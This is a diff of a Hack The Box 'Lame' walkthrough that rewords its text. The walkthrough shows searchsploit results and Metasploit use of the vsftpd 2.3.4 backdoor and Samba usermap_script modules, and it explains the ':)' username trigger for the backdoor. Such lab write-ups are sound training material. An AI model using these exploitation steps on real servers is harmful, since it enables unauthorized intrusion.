@@ -75,7 +75,7 @@ vsftpd 2.3.4 - Backdoor Command Execution (Metasploit | exploits/unix/remote/174
 Shellcodes: No Result
 ```
 
-It seems this version has a backdoor that allows command execution. Use [Metasploit](https://github.com/rapid7/metasploit-framework) to get more information:
+It seems this version has a backdoor that allows command execution. Search the backdoor on [Metasploit](https://github.com/rapid7/metasploit-framework):
 ```bash
 root@kali:~/htb/lame# metasploit
 
@@ -118,7 +118,7 @@ msf exploit(unix/ftp/vsftpd_234_backdoor) > exploit
 ```
 No luck here 😭
 
-Note that this backdoor can be easily exploited manually if the server is vulnerable. When connecting to the FTP server, it's enough to pass a smiley face as username `:)` to exploit it. Check out the [pastebin](https://pastebin.com/AetT9sS5) with the code diff of vsftpd that includes the code of the backdoor. Note that `0x3a` `0x29` in hexa represent `:` and `)` respectively 🙃
+Note that this backdoor can be easily exploited manually if the server is vulnerable. When connecting to the FTP server, it's enough to pass a smiley face as username `:)` to exploit it. Check out this [pastebin](https://pastebin.com/AetT9sS5) with the code diff of vsftpd that includes the code of the backdoor. Note that `0x3a` `0x29` in hexa represent `:` and `)` respectively 🙃
 
 ### Samba server
 Let's move to Samba now. Search server's version using `searchsploit`:
@@ -134,7 +134,7 @@ Samba < 3.0.20 - Remote Heap Overflow                                          |
 ------------------------------------------------------------------------------- ----------------------------------------
 ```
 
-Let's search on Metasploit for the first one:
+Search on Metasploit for the first one:
 ```
 msf exploit(linux/samba/is_known_pipename) > search samba 3.0.20 | sort -n
 
@@ -191,7 +191,7 @@ Matching Modules
 
 ```
 
-Exploit it:
+Set and exploit:
 ```
 msf > use exploit/multi/samba/usermap_script
 msf exploit(multi/samba/usermap_script) > options
